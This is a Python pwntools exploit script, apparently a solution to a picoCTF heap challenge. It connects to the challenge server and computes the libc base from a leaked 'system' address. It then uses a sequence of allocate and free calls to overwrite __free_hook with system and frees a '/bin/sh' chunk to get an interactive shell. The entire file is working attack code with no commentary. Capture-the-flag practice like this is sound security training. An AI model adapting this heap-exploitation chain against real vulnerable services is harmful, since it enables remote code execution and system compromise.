from pwn import * 

def add_power(p, size, content):
	
	p.recvuntil("> ")
	p.sendline("1")

	p.recvuntil("> ")
	p.sendline(str(size))

	p.recvuntil("> ")
	p.sendline(content)


def remove_power(p, index):
	
	p.recvuntil("> ")
	p.sendline("2")

	p.recvuntil("> ")
	p.sendline(str(index))


def main():

	host = "jupiter.challenges.picoctf.org"
	port = 10089
	libc = ELF("./libc.so.6")
	p = remote(host, port)

	p.sendline("y")

	p.recvuntil(": ")

	leak = p.recvline().decode().replace("\n", "")
	leak = int(leak, 16)
	log.info(f"leak: {hex(leak)}")
	libc_base = leak - libc.symbols['system']
	log.info(f"libc base: {hex(libc_base)}")

	libc.address = libc_base

	free_hook = libc.symbols['__free_hook']
	log.info(f"free_hook : {hex(free_hook)}")

	add_power(p, 0x58, 'A' * 0x58)
	add_power(p, 0x180, 'B' * 0x180)

	remove_power(p, 0)
	remove_power(p, 1)

	add_power(p, 0x58, "/bin/sh\x00" + "C" * 0x50)

	remove_power(p, 1)

	add_power(p, 0x180, 'D' * 0x180)
	remove_power(p, 3)

	add_power(p, 0xf0, p64(free_hook) + b'E' * 0xe8)
	add_power(p, 0xf0, 'F'*0xf0)

	system = libc.symbols['system']
	add_power(p, 0xf0, p64(system) + b'G' * 0xe8 )
	remove_power(p, 0)

	p.interactive()
if __name__ == "__main__":

	main()


